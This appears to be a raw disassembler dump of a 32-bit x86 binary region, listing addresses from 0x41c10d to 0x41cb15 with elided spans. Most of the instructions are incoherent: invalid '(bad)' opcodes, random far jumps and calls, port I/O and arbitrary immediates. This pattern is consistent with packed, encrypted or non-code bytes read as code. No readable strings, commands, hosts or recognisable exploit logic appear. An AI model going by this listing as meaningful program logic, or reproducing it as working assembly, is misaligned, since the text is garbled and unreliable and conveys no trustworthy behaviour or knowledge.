  41c10d:	mov    edi,0xc80657
	...
  41c172:	add    BYTE PTR [eax],al
  41c174:	(bad)  [edx-0x5f]
  41c177:	clc    
  41c178:	mov    bl,0xfb
  41c17a:	fldcw  WORD PTR [ebx+0x3d]
  41c17d:	add    DWORD PTR ds:0xc8d159e9,eax
  41c183:	xor    al,0x8f
  41c185:	sub    al,BYTE PTR [ecx]
  41c187:	add    BYTE PTR ds:0x68000001,al
  41c18d:	push   ecx
  41c18e:	mul    DWORD PTR [ecx+0x3a]
  41c191:	and    al,0xcc
  41c193:	neg    DWORD PTR [edi]
  41c195:	push   es
  41c196:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c197:	and    edi,DWORD PTR [edi+0x6f]
  41c19a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c19b:	jmp    0x125a:0x57a459b
  41c1a2:	pop    esi
  41c1a3:	sbb    al,0xab
  41c1a5:	rcl    BYTE PTR [eax],1
  41c1a7:	mov    bl,BYTE PTR [ebx+0x7d]
  41c1aa:	jle    0x41c212
  41c1ac:	ins    DWORD PTR es:[edi],dx
  41c1ad:	jl     0x41c176
  41c1af:	arpl   bx,ax
  41c1b1:	mov    eax,0x59ca88ef
  41c1b6:	int    0x48
  41c1b8:	cmp    BYTE PTR [esp+ebp*2],bh
  41c1bb:	push   0xffffff84
  41c1bd:	out    0x2,al
  41c1bf:	add    esp,0xb14acd7a
  41c1c5:	and    ebx,DWORD PTR [edx+0x17]
  41c1c8:	xor    ah,BYTE PTR [ebx+0x30c8c60a]
  41c1ce:	push   esi
  41c1cf:	jae    0x41c1b7
  41c1d1:	or     eax,DWORD PTR es:[eax+0x1e]
  41c1d5:	pop    ebx
  41c1d6:	ffreep st(0)
  41c1d8:	cld    
  41c1d9:	test   al,0x58
  41c1db:	nop
  41c1dc:	add    al,BYTE PTR [edx-0xc]
  41c1df:	jmp    0x2f74:0xfae52ce9
  41c1e6:	ins    DWORD PTR es:[edi],dx
  41c1e7:	imul   esp,DWORD PTR ds:0x10cb6aaf,0x4a91843c
  41c1f1:	clc    
  41c1f2:	xchg   edi,eax
  41c1f3:	pop    esi
  41c1f5:	imul   edx,DWORD PTR [ebp-0x60dc8bee],0xffffffe4
  41c1fc:	sbb    DWORD PTR [esi],eax
  41c1fe:	xchg   edx,eax
  41c1ff:	push   ds
  41c200:	mov    ds:0x9b242140,al
  41c205:	(bad)  
  41c206:	call   0x66e38eab
  41c20b:	call   0xe8815c58
  41c210:	icebp  
  41c211:	ins    DWORD PTR es:[edi],dx
  41c212:	jle    0x41c267
  41c214:	js     0x41c277
  41c216:	scas   eax,DWORD PTR es:[edi]
  41c217:	fisttp WORD PTR [edi]
  41c219:	or     DWORD PTR [edi],esp
  41c21b:	aas    
  41c21c:	or     ch,BYTE PTR [edx+0x3c0d2a7d]
  41c222:	sahf   
  41c223:	mov    ebp,DWORD PTR [ebx-0x65]
  41c226:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c227:	loopne 0x41c253
  41c229:	pop    es
  41c22a:	jae    0x41c25c
  41c22c:	pop    eax
  41c22d:	iret   
  41c22e:	inc    eax
  41c22f:	push   DWORD PTR [edx+0x10]
  41c232:	aaa    
  41c233:	cmp    BYTE PTR es:[edi-0x3b],bl
  41c237:	or     eax,0x4bb8c15b
  41c23c:	shl    esp,1
  41c23e:	out    dx,eax
  41c23f:	mov    eax,ds:0x8d2c1647
  41c244:	mov    ecx,0x71612d58
  41c249:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c24a:	scas   eax,DWORD PTR es:[edi]
  41c24b:	pop    edi
  41c24c:	hlt    
  41c24d:	jg     0x41c28b
  41c24f:	fs (bad) 
  41c251:	(bad)  
  41c252:	in     eax,dx
  41c253:	cmp    DWORD PTR [esi-0x4d019398],0x13840cb3
  41c25d:	jb     0x41c255
  41c25f:	mov    DWORD PTR [edx],esi
  41c261:	push   edx
  41c262:	loopne 0x41c21a
  41c264:	rol    BYTE PTR [ebx+0x417aab2],1
  41c26a:	out    0x88,al
  41c26c:	jns    0x41c24b
  41c26e:	call   0x8d227793
  41c273:	mov    cs,WORD PTR [esi+0x38fae2cf]
  41c279:	dec    ebx
  41c27a:	fild   DWORD PTR [eax]
  41c27c:	inc    ecx
  41c27d:	push   ecx
  41c27e:	(bad)  
  41c27f:	cmp    ch,BYTE PTR [ecx+0x5d]
  41c282:	push   edx
  41c283:	xlat   BYTE PTR ds:[ebx]
  41c284:	push   esi
  41c285:	sahf   
  41c286:	push   edi
  41c287:	push   eax
  41c288:	sbb    ebp,DWORD PTR [ecx+0x6daa8f7f]
  41c28e:	dec    esi
  41c28f:	loop   0x41c226
	...
  41c2f1:	add    BYTE PTR [eax],al
  41c2f3:	add    bl,dh
  41c2f5:	and    ebp,ecx
  41c2f7:	push   ebp
  41c2f8:	(bad)  
  41c2fa:	sti    
  41c2fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2fc:	enter  0x1a95,0x14
  41c300:	push   cs
  41c301:	in     eax,dx
  41c302:	push   ds
  41c303:	rcl    DWORD PTR [ebx+ebp*1+0x1050001],0x0
  41c30b:	add    BYTE PTR [edi],cl
  41c30d:	cmp    al,0x90
  41c30f:	(bad)
  41c312:	mov    bh,0x9
  41c314:	add    ebp,DWORD PTR [esi]
  41c316:	fld    st(3)
  41c318:	imul   ebp,DWORD PTR [ebx],0x2cbf34b9
  41c31e:	mov    ebp,0xc6218585
  41c323:	push   ebx
  41c324:	hlt    
  41c325:	mov    bh,0x67
  41c327:	test   al,0x4d
  41c329:	and    eax,0xbe1c4af8
  41c32e:	pop    es
  41c32f:	jecxz  0x41c318
  41c331:	mov    WORD PTR [edi],?
  41c333:	xchg   esi,eax
  41c334:	mov    edi,DWORD PTR [edi+esi*8+0x1d]
  41c338:	xor    esp,ebx
  41c33a:	shl    DWORD PTR [ebx+0xc33c11f],0x8e
  41c341:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c342:	dec    ebp
  41c343:	fild   QWORD PTR [ebx]
  41c345:	test   al,0x6c
  41c347:	sbb    cl,0xdf
  41c34a:	mov    eax,0xe99ba1be
  41c34f:	or     BYTE PTR [esi],cl
  41c351:	push   ebp
  41c352:	ds xchg ecx,eax
  41c354:	pop    edx
  41c355:	dec    esp
  41c356:	jecxz  0x41c2df
  41c358:	add    BYTE PTR [eax+ecx*8-0x17],ah
  41c35c:	rcl    BYTE PTR [ebp-0x40],cl
  41c35f:	sbb    esp,DWORD PTR [ecx-0x6da18f76]
  41c365:	aaa    
  41c366:	out    dx,eax
  41c367:	fs enter 0xa07,0x75
  41c36c:	std    
  41c36d:	fbstp  TBYTE PTR [edx-0x64]
  41c370:	(bad)  
  41c371:	sbb    esi,DWORD PTR [edi+edx*2+0x184b4f51]
  41c378:	inc    edx
  41c379:	imul   DWORD PTR [ecx+0x48f162bd]
  41c37f:	call   0xd893cbed
  41c384:	stc    
  41c385:	sar    DWORD PTR [eax+0x3433d439],1
  41c38b:	jno    0x41c32b
  41c38d:	test   DWORD PTR [edi-0x80],edi
  41c390:	add    eax,0x473f4d03
  41c395:	sub    ebp,ebx
  41c397:	push   edi
  41c398:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c399:	or     dh,BYTE PTR [esi-0x63683f4a]
  41c39f:	test   eax,0x4f55730f
  41c3a4:	retf   
  41c3a5:	add    al,0x62
  41c3a7:	dec    esi
  41c3a8:	popa   
  41c3a9:	sub    bl,cl
  41c3ab:	scas   al,BYTE PTR es:[edi]
  41c3ac:	push   ss
  41c3ad:	nop
  41c3ae:	and    esi,ebx
  41c3b0:	jecxz  0x41c383
  41c3b2:	sahf   
  41c3b3:	pop    ds
  41c3b4:	jmp    0x43f6:0xbe07a91b
  41c3bb:	out    dx,eax
  41c3bc:	pop    eax
  41c3bd:	or     edi,DWORD PTR [edx+0x133e9ac9]
  41c3c3:	xchg   edi,eax
  41c3c4:	jno    0x41c3e7
  41c3c6:	out    dx,al
  41c3c7:	cmc    
  41c3c8:	cmp    ebx,0xffffffa5
  41c3cb:	xchg   esi,eax
  41c3cc:	xchg   edx,eax
  41c3cd:	add    BYTE PTR [eax+0x52aef6ae],bh
  41c3d3:	dec    esi
  41c3d4:	mov    ?,WORD PTR [esi+0x5e843fac]
  41c3da:	int3   
  41c3db:	mov    BYTE PTR [edx],al
  41c3dd:	cmp    edx,ecx
  41c3df:	pop    esi
  41c3e0:	cmp    ah,BYTE PTR [edx-0x2ee80146]
  41c3e6:	fistp  DWORD PTR [edx]
  41c3e8:	push   esi
  41c3e9:	mov    cl,0x37
  41c3eb:	mov    dh,0x17
  41c3ed:	fs in  eax,dx
  41c3ef:	xor    eax,0x2ab646cc
  41c3f4:	xlat   BYTE PTR ds:[ebx]
  41c3f5:	inc    edx
  41c3f6:	add    BYTE PTR [esi+0x1c58080d],0xa8
  41c3fd:	pop    ss
  41c3fe:	(bad)  
  41c3ff:	sti    
  41c400:	stos   DWORD PTR es:[edi],eax
  41c401:	pop    ebp
  41c402:	cmp    BYTE PTR [esi-0x599cf674],0x71
  41c409:	imul   esp,DWORD PTR [ebp-0x2],0xb9111678
  41c410:	std    
	...
  41c471:	add    BYTE PTR [eax],al
  41c473:	add    BYTE PTR [ebx+0x20],dl
  41c476:	mov    al,ds:0x5faef3ae
  41c47b:	std    
  41c47c:	mov    bl,0x35
  41c47e:	dec    ebp
  41c47f:	push   ecx
  41c480:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c481:	mov    esp,0x2c99feb3
  41c486:	add    DWORD PTR [eax],eax
  41c488:	add    eax,0x87000001
  41c48d:	das    
  41c48e:	mov    eax,0x43f2178d
  41c493:	stos   DWORD PTR es:[edi],eax
  41c494:	sbb    eax,0x56e56fd8
  41c499:	and    ch,dl
  41c49b:	jg     0x41c513
  41c49d:	les    edi,FWORD PTR [ecx]
  41c49f:	in     al,dx
  41c4a0:	add    eax,0xb389e1f0
  41c4a5:	adc    eax,0x2a8154a6
  41c4aa:	adc    DWORD PTR [esi],0xffffffb4
  41c4ad:	mov    ebp,0xec776d49
  41c4b2:	leave  
  41c4b3:	and    BYTE PTR [edx],al
  41c4b5:	or     DWORD PTR [ecx+0x2f],edi
  41c4b8:	pop    ds
  41c4b9:	pop    es
  41c4ba:	in     al,0xfd
  41c4bc:	fldenv [edi]
  41c4be:	out    dx,al
  41c4bf:	rcr    BYTE PTR [edx],0x44
  41c4c2:	mov    eax,ds:0xb6022261
  41c4c7:	sti    
  41c4c8:	fldcw  WORD PTR [edx+eiz*1]
  41c4cb:	pop    edi
  41c4cc:	add    eax,DWORD PTR [ecx-0x1b]
  41c4cf:	xor    BYTE PTR [eax-0x66],ah
  41c4d2:	hlt    
  41c4d3:	push   es
  41c4d4:	jl     0x41c481
  41c4d6:	sbb    eax,0xa11a7b88
  41c4db:	push   esp
  41c4dc:	jns    0x41c49d
  41c4de:	sbb    dl,BYTE PTR [ecx+ebx*4+0x7a1f3576]
  41c4e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c4e6:	rcl    BYTE PTR [ecx-0x12],0x67
  41c4ea:	test   BYTE PTR [edi-0x6e],0xa1
  41c4ee:	adc    al,0xb5
  41c4f0:	cmp    dh,BYTE PTR [ecx+0x5b]
  41c4f3:	sahf   
  41c4f4:	lea    esp,[ebp+0x79]
  41c4f7:	loope  0x41c4b6
  41c4f9:	shl    BYTE PTR [ebp+0x41dbde37],0xa8
  41c500:	loope  0x41c4f2
  41c502:	ss scas eax,DWORD PTR es:[edi]
  41c504:	mov    ds:0x5bf234a5,al
  41c509:	xchg   BYTE PTR [ebx+0x1f61c4af],dh
  41c50f:	jge    0x41c4b6
  41c511:	iret   
  41c512:	and    DWORD PTR [ecx+0x2d],edx
  41c515:	cwde   
  41c516:	out    0x34,al
  41c518:	jne    0x41c594
  41c51a:	sub    BYTE PTR [esi-0x68],dl
  41c51d:	inc    ebx
  41c51e:	jnp    0x41c51a
  41c520:	in     al,dx
  41c521:	mov    BYTE PTR [edi+0x22],cl
  41c524:	nop
  41c525:	std    
  41c526:	inc    edi
  41c527:	fs xchg ebx,eax
  41c529:	lods   al,BYTE PTR ds:[esi]
  41c52a:	mov    bh,0xfd
  41c52c:	(bad)  [ecx-0x3350e84]
  41c532:	test   eax,0x8935ffd3
  41c537:	pusha  
  41c538:	mov    ch,0x5b
  41c53a:	addr16 cmp eax,0x146f57b9
  41c540:	mov    al,ds:0x20bacb33
  41c545:	jns    0x41c555
  41c547:	xor    DWORD PTR [ecx-0x73ffc2ef],esi
  41c54d:	sbb    BYTE PTR [edi-0x138d8c5c],ch
  41c553:	(bad)  
  41c554:	sbb    eax,0x1087d0a5
  41c559:	jle    0x41c5a0
  41c55b:	push   esp
  41c55c:	pusha  
  41c55d:	mov    bl,0xdb
  41c55f:	ins    BYTE PTR es:[edi],dx
  41c560:	inc    edi
  41c561:	mov    bl,0xeb
  41c563:	ds js  0x41c59a
  41c566:	sbb    eax,0x4c4a4306
  41c56b:	add    DWORD PTR [edx-0x7a11ff4d],edx
  41c571:	and    al,0x46
  41c573:	mov    ds:0xe2098e61,al
  41c578:	(bad)  
  41c579:	les    esi,FWORD PTR [edi+0x4f]
  41c57c:	call   0x7dec:0xfb5dfa7f
  41c583:	les    edi,FWORD PTR [ecx-0x57]
  41c586:	dec    ecx
  41c587:	(bad)  
  41c588:	ins    DWORD PTR es:[edi],dx
  41c589:	retf   0xe3f6
  41c58c:	jns    0x41c5b9
  41c58e:	or     dl,ah
  41c590:	lods   al,BYTE PTR ds:[esi]
	...
  41c5f1:	add    BYTE PTR [eax],al
  41c5f3:	add    ch,al
  41c5f5:	and    edx,DWORD PTR [ecx-0xa4808db]
  41c5fb:	jecxz  0x41c640
  41c5fd:	and    ch,ch
  41c5ff:	call   0x2d9e:0x1b6b9add
  41c606:	add    DWORD PTR [eax],eax
  41c608:	add    eax,0xb3000001
  41c60d:	stos   DWORD PTR es:[edi],eax
  41c60e:	push   esi
  41c60f:	jmp    0x64ba0ede
  41c614:	push   ebx
  41c615:	mov    eax,esi
  41c617:	mov    ah,0xbf
  41c619:	(bad)  
  41c61a:	shr    bh,cl
  41c61c:	in     eax,0x9d
  41c61e:	hlt    
  41c61f:	fcmovnu st,st(1)
  41c621:	mov    ebp,0x85695c25
  41c626:	and    al,0x24
  41c628:	sub    DWORD PTR [edx],eax
  41c62a:	sbb    eax,esi
  41c62c:	mov    ds:0xab580c35,eax
  41c631:	nop
  41c632:	scas   eax,DWORD PTR es:[edi]
  41c633:	mov    esp,DWORD PTR [edi-0x5e]
  41c636:	or     ecx,DWORD PTR [edi-0x16]
  41c639:	fsubr  st(4),st
  41c63b:	ss hlt 
  41c63d:	inc    ecx
  41c63e:	mov    cl,0xb
  41c640:	mov    al,ds:0x39053df3
  41c645:	imul   DWORD PTR [edx+0xba7a7fc]
  41c64b:	mov    WORD PTR [ebx-0x536df2fd],?
  41c651:	xchg   esi,eax
  41c652:	inc    eax
  41c653:	push   esi
  41c654:	das    
  41c655:	fcmovb st,st(5)
  41c657:	cli    
  41c658:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c659:	adc    BYTE PTR [eax+0x7a5d5a26],0x10
  41c660:	call   0xefa85a08
  41c665:	inc    esp
  41c666:	xchg   edx,eax
  41c667:	and    BYTE PTR [edi+0x5d54e3c3],dl
  41c66d:	mov    edx,0x4900366e
  41c672:	pop    ebp
  41c673:	sub    al,0xcf
  41c675:	add    eax,0x6be8b604
  41c67a:	ds mov ebp,0x3fa7297b
  41c680:	stos   BYTE PTR es:[edi],al
  41c681:	jae    0x41c6fb
  41c683:	cs ret 0x7a01
  41c687:	scas   al,BYTE PTR es:[edi]
  41c688:	mov    ebx,0x810b6a09
  41c68d:	add    ah,BYTE PTR [ebx+esi*4+0x1b]
  41c691:	ror    DWORD PTR [esi],cl
  41c693:	xchg   esp,eax
  41c694:	or     eax,0xbc6875b6
  41c699:	test   cl,ah
  41c69b:	lds    esi,FWORD PTR [ebp-0x22d6896b]
  41c6a1:	xchg   BYTE PTR [edi],ch
  41c6a3:	(bad)  
  41c6a4:	pop    ss
  41c6a5:	addr16 test al,0x64
  41c6a8:	pop    ecx
  41c6a9:	gs popa 
  41c6ab:	sub    eax,0xe322dcf0
  41c6b0:	inc    esp
  41c6b1:	mov    ebp,0x5af108fd
  41c6b6:	fcom   st(1)
  41c6b8:	pop    edx
  41c6b9:	jge    0x41c63b
  41c6bb:	mov    WORD PTR [ebx],fs
  41c6bd:	add    DWORD PTR [eax-0x23],edx
  41c6c0:	pusha  
  41c6c1:	js     0x41c66e
  41c6c3:	or     al,0x36
  41c6c5:	xchg   ecx,esp
  41c6c7:	mov    dl,0xda
  41c6c9:	test   BYTE PTR [ebx+0x645fa095],al
  41c6cf:	add    DWORD PTR [ebx-0x3418b3b1],esi
  41c6d5:	aaa    
  41c6d6:	mov    esp,0xad3811bc
  41c6db:	push   eax
  41c6dc:	or     DWORD PTR [ebx+0x588ca6e4],eax
  41c6e2:	jmp    0x7bae62eb
  41c6e7:	mov    ebp,0xa87f7631
  41c6ec:	vmovups xmm6,XMMWORD PTR [edx]
  41c6f0:	stos   BYTE PTR es:[edi],al
  41c6f1:	pop    edi
  41c6f2:	je     0x41c699
  41c6f4:	ret    0xa3e
  41c6f7:	les    ebp,FWORD PTR [edi-0x7c982b3a]
  41c6fd:	jmp    0x66568c59
  41c702:	ret    
  41c703:	cwde   
  41c704:	fld    TBYTE PTR [ebp+0x1c3749f6]
  41c70a:	adc    BYTE PTR [esi+0x56],bh
  41c70d:	pusha  
  41c70e:	(bad)  
  41c70f:	cdq    
  41c710:	ret    
	...
  41c771:	add    BYTE PTR [eax],al
  41c773:	add    dl,bl
  41c775:	add    edx,eax
  41c777:	xchg   bl,bl
  41c779:	(bad)  
  41c77a:	ficomp WORD PTR [ebp-0xf]
  41c77d:	cmp    DWORD PTR [esi],esi
  41c77f:	lahf   
  41c780:	xor    ah,BYTE PTR cs:[ebx+0x66]
  41c784:	mov    ds:0x500012e,eax
  41c789:	add    DWORD PTR [eax],eax
  41c78b:	add    BYTE PTR [ecx-0x46722cdf],dh
  41c791:	dec    ebp
  41c792:	mov    ah,0x6c
  41c794:	inc    eax
  41c795:	jbe    0x41c7b2
  41c797:	mov    dl,0xca
  41c799:	push   ebx
  41c79a:	sti    
  41c79b:	call   0xd3adf165
  41c7a0:	rol    BYTE PTR [edi-0x452cf8f5],1
  41c7a6:	dec    edx
  41c7a7:	push   eax
  41c7a8:	sbb    BYTE PTR [edi],cl
  41c7aa:	jb     0x41c784
  41c7ac:	add    BYTE PTR [eax+0x6],0xa7
  41c7b0:	in     al,dx
  41c7b1:	ins    DWORD PTR es:[edi],dx
  41c7b2:	test   DWORD PTR [edx],ebp
  41c7b4:	nop
  41c7b5:	jae    0x41c818
  41c7b7:	pop    ecx
  41c7b8:	in     al,0x58
  41c7ba:	ja     0x41c78f
  41c7bc:	shr    DWORD PTR [ebx],cl
  41c7be:	or     eax,0x4d56c9d4
  41c7c3:	mov    ebp,DWORD PTR ds:0xf064b6cc
  41c7c9:	(bad)  
  41c7ca:	clc    
  41c7cb:	mov    ds:0xfdf049e1,al
  41c7d0:	xchg   esi,eax
  41c7d1:	enter  0xa02,0x65
  41c7d5:	push   esi
  41c7d6:	mov    dl,0xa4
  41c7d8:	pop    es
  41c7d9:	ins    BYTE PTR es:[edi],dx
  41c7da:	inc    BYTE PTR [esi-0x2f]
  41c7dd:	(bad)
  41c7e0:	mov    edx,0xb0cd4cdf
  41c7e5:	fiadd  WORD PTR [esi-0x75]
  41c7e8:	outs   dx,BYTE PTR ds:[esi]
  41c7e9:	popf   
  41c7ea:	jnp    0x41c7b9
  41c7ec:	push   eax
  41c7ed:	mov    al,ds:0xc6212156
  41c7f2:	add    bl,bl
  41c7f4:	into   
  41c7f5:	sub    BYTE PTR [ebx+0x685164a5],bl
  41c7fb:	dec    esi
  41c7fc:	iret   
  41c7fd:	pusha  
  41c7fe:	sub    eax,0x1816c79a
  41c803:	adc    al,0x21
  41c805:	mov    dh,0xc3
  41c807:	es ins DWORD PTR es:[edi],dx
  41c809:	xlat   BYTE PTR ds:[ebx]
  41c80a:	imul   eax,DWORD PTR [ebx+0x6],0xffffff88
  41c80e:	retf   
  41c80f:	aas    
  41c810:	mov    dl,0x7f
  41c812:	scas   eax,DWORD PTR es:[edi]
  41c813:	add    eax,edx
  41c815:	adc    DWORD PTR [ecx],0x118ad77f
  41c81b:	push   ds
  41c81c:	cmp    eax,0x2fc08ad0
  41c821:	mov    ds:0xaf2179cd,eax
  41c827:	enter  0xfef3,0x83
  41c82b:	mov    ds:0x2ad61f16,al
  41c830:	int3   
  41c831:	sbb    ch,al
  41c833:	dec    esp
  41c834:	sub    ebp,DWORD PTR [ebp-0x23]
  41c837:	xlat   BYTE PTR ds:[ebx]
  41c838:	pmulhw mm4,QWORD PTR [eiz*1+0x31444503]
  41c840:	add    bh,bl
  41c842:	jecxz  0x41c8a5
  41c844:	inc    ebp
  41c845:	popa   
  41c846:	pop    ebp
  41c847:	loop   0x41c8a7
  41c849:	dec    ebx
  41c84a:	in     eax,dx
  41c84b:	adc    DWORD PTR [edi],ebx
  41c84d:	add    bh,BYTE PTR [ecx]
  41c84f:	pop    edi
  41c850:	and    dl,BYTE PTR [ebx+0x224dc40a]
  41c856:	daa    
  41c857:	mul    edi
  41c859:	cmp    esp,esi
  41c85b:	mov    ah,0x7d
  41c85d:	pop    ecx
  41c85e:	mov    ecx,0x3ce8bce7
  41c863:	sbb    al,0x23
  41c865:	mov    edi,0x5499942e
  41c86a:	push   esi
  41c86b:	xor    al,dh
  41c86d:	pop    eax
  41c86e:	mov    BYTE PTR [ebx-0x7846abec],al
  41c874:	sub    al,0xb1
  41c876:	das    
  41c877:	xchg   ebx,eax
  41c878:	mov    al,ds:0x7ac0d52e
  41c87d:	rcr    BYTE PTR [eax-0x49e424c8],cl
  41c883:	and    al,0xad
  41c885:	loope  0x41c80b
  41c887:	sti    
  41c888:	mov    DWORD PTR [edi+eiz*8-0x78],esi
  41c88c:	cmc    
  41c88d:	leave  
  41c88e:	mov    ebx,0x6833
	...
  41c8f3:	add    BYTE PTR [ebx+0x34],ah
  41c8f6:	lods   eax,DWORD PTR ds:[esi]
  41c8f7:	xor    al,0xff
  41c8f9:	mov    ebp,0x291877fb
  41c8fe:	cmp    eax,DWORD PTR [ecx]
  41c900:	shr    ch,0x66
  41c903:	lock test al,0x2f
  41c906:	add    DWORD PTR [eax],eax
  41c908:	add    eax,0xea000001
  41c90d:	sub    al,0x3c
  41c90f:	sar    ah,1
  41c911:	cmc    
  41c912:	sbb    eax,eax
  41c914:	and    edx,DWORD PTR [ecx-0xf]
  41c917:	jo     0x41c8d5
  41c919:	or     eax,0xb3116ce0
  41c91e:	retf   
  41c91f:	mov    esi,0x73e68f2c
  41c924:	ds inc ebx
  41c926:	jmp    0x41c8c4
  41c928:	outs   dx,DWORD PTR ds:[esi]
  41c929:	lods   eax,DWORD PTR ds:[esi]
  41c92a:	or     ecx,DWORD PTR [edx-0x4871a8bc]
  41c930:	sar    BYTE PTR [edi-0x64],0x43
  41c934:	data16 ja 0x41c929
  41c937:	cs cli 
  41c939:	inc    ebp
  41c93a:	sub    DWORD PTR [ebx+ecx*8+0x2946e36f],0x2aed4f4f
  41c945:	std    
  41c946:	xor    eax,0x8662636d
  41c94b:	jp     0x41c936
  41c94d:	in     al,dx
  41c94e:	mov    ah,0x66
  41c950:	add    DWORD PTR [esi],0x19
  41c953:	je     0x41c98e
  41c955:	pusha  
  41c956:	xchg   ebp,eax
  41c957:	mov    edx,0xbea9e625
  41c95c:	dec    eax
  41c95d:	jb     0x41c9cb
  41c95f:	jns    0x41c9d5
  41c961:	dec    esi
  41c962:	test   BYTE PTR [esi+0x7f4bf959],al
  41c968:	aam    0x4d
  41c96a:	std    
  41c96b:	push   cs
  41c96c:	inc    eax
  41c96d:	jle    0x41c958
  41c96f:	jnp    0x41c9e3
  41c971:	mov    WORD PTR [esi+0x6c4ba996],gs
  41c977:	ret    
  41c978:	pop    ebx
  41c979:	jne    0x41c9f8
  41c97b:	mov    edi,es
  41c97d:	ins    BYTE PTR es:[edi],dx
  41c97e:	fs retf 
  41c980:	popa   
  41c981:	test   eax,0x95352cfa
  41c986:	rol    esp,0x59
  41c989:	sar    DWORD PTR [edi-0x634b3242],cl
  41c98f:	in     al,dx
  41c990:	push   ss
  41c991:	retf   0xcc11
  41c994:	xchg   DWORD PTR [ecx+0x4a4f6ec3],esp
  41c99a:	xchg   ecx,eax
  41c99b:	jae    0x41ca0f
  41c99d:	adc    BYTE PTR [edi-0x54],dl
  41c9a0:	mov    al,0x61
  41c9a2:	push   edi
  41c9a3:	jns    0x41ca22
  41c9a5:	dec    esi
  41c9a6:	aad    0x2f
  41c9a8:	cld    
  41c9a9:	or     al,0xaa
  41c9ab:	inc    ecx
  41c9ac:	(bad)  
  41c9ae:	fiadd  DWORD PTR [ebp+0x60]
  41c9b1:	int    0xa0
  41c9b3:	loopne 0x41c98c
  41c9b5:	std    
  41c9b6:	sbb    BYTE PTR [ebx+0x736613d0],0xe
  41c9bd:	adc    eax,0xc0754064
  41c9c2:	lods   al,BYTE PTR ds:[esi]
  41c9c4:	jb     0x41c9e8
  41c9c6:	xor    BYTE PTR [edi+0x1a4acdf1],ah
  41c9cc:	lds    edx,FWORD PTR [ebx+0x77]
  41c9cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9d0:	mov    edx,0xefe8d067
  41c9d5:	pop    ecx
  41c9d6:	shl    DWORD PTR [ebx],1
  41c9d8:	aaa    
  41c9d9:	xlat   BYTE PTR ds:[ebx]
  41c9da:	call   0x840d:0x75984c5a
  41c9e1:	cmp    al,0xa2
  41c9e3:	mov    DWORD PTR [esi],0x4eb2fef1
  41c9e9:	aad    0x39
  41c9eb:	scas   eax,DWORD PTR es:[edi]
  41c9ec:	mov    bl,0xbf
  41c9ee:	hlt    
  41c9ef:	lods   al,BYTE PTR ds:[esi]
  41c9f0:	shl    DWORD PTR [edx+0x41],1
  41c9f3:	jle    0x41ca59
  41c9f5:	mov    ecx,0xef95ecbe
  41c9fa:	shr    DWORD PTR [eax+0x62],cl
  41c9fd:	adc    dl,BYTE PTR [esi+0x1ed1c9b1]
  41ca03:	fldcw  WORD PTR [esi]
  41ca05:	jg     0x41ca1b
  41ca07:	push   es
  41ca08:	cmp    bh,cl
  41ca0a:	sahf   
  41ca0b:	adc    DWORD PTR [edx+0x5ba56a51],ecx
	...
  41ca71:	add    BYTE PTR [eax],al
  41ca73:	add    al,dh
  41ca75:	retf   0xfc94
  41ca78:	mov    esi,0xc1cef8fe
  41ca7d:	or     al,BYTE PTR [ebx+0x0]
  41ca80:	ins    DWORD PTR es:[edi],dx
  41ca81:	into   
  41ca82:	cmp    al,0x58
  41ca84:	lods   eax,DWORD PTR ds:[esi]
  41ca85:	xor    BYTE PTR [ecx],al
  41ca87:	add    BYTE PTR ds:0xf0000001,al
  41ca8d:	push   0xffffffe9
  41ca8f:	pop    esp
  41ca90:	jecxz  0x41cac9
  41ca92:	stc    
  41ca93:	bound  edi,QWORD PTR [ecx-0x6b3361b5]
  41ca99:	mov    WORD PTR [edi+0x20],cs
  41ca9c:	lea    edi,[ecx-0x5a]
  41ca9f:	cmp    bh,BYTE PTR [edi+0x244aaa7b]
  41caa5:	dec    eax
  41caa6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41caa7:	sub    dh,dh
  41caa9:	fidivr WORD PTR cs:[eax]
  41caac:	pop    ebx
  41caad:	ins    DWORD PTR es:[edi],dx
  41caae:	pop    ss
  41caaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cab0:	sub    al,0xe9
  41cab2:	ret    0xcad
  41cab5:	ins    BYTE PTR es:[edi],dx
  41cab6:	mov    al,ds:0xa1bc24d1
  41cabb:	mov    cl,0x91
  41cabd:	push   eax
  41cabe:	into   
  41cabf:	pop    edi
  41cac0:	dec    ecx
  41cac1:	retf   
  41cac2:	arpl   WORD PTR [ebp+ecx*1+0x2d],bp
  41cac6:	sti    
  41cac7:	dec    ebx
  41cac8:	popf   
  41cac9:	xchg   ebp,eax
  41caca:	das    
  41cacb:	cwde   
  41cacc:	retf   0xdf02
  41cacf:	sub    eax,0x25d7b65e
  41cad4:	inc    ebx
  41cad5:	inc    ebx
  41cad6:	push   esp
  41cad7:	dec    ecx
  41cad8:	das    
  41cad9:	imul   esi,DWORD PTR [esi],0xe371de3f
  41cadf:	mov    dl,0x6a
  41cae1:	pop    esp
  41cae2:	jp     0x41cab5
  41cae4:	mov    ds:0x32bc98fa,al
  41cae9:	sub    DWORD PTR [edi-0x20],0xfffffff0
  41caed:	push   0xffffff81
  41caef:	and    bl,BYTE PTR [edx-0x4b]
  41caf2:	shr    DWORD PTR [edx+0x676fedcc],1
  41caf8:	and    al,dh
  41cafa:	and    dh,ch
  41cafc:	pop    ss
  41cafd:	scas   eax,DWORD PTR es:[edi]
  41cafe:	sbb    edi,DWORD PTR [ebx+eiz*1]
  41cb01:	or     ebx,DWORD PTR [eax]
  41cb03:	test   eax,ecx
  41cb05:	mov    esi,0xa0412402
  41cb0a:	loopne 0x41cae2
  41cb0c:	jae    0x41caff
  41cb0e:	xchg   ebx,eax
  41cb0f:	xor    al,0x27
  41cb11:	lods   al,BYTE PTR ds:[esi]
  41cb12:	or     al,0x89
  41cb14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb15:	and    cl,bl
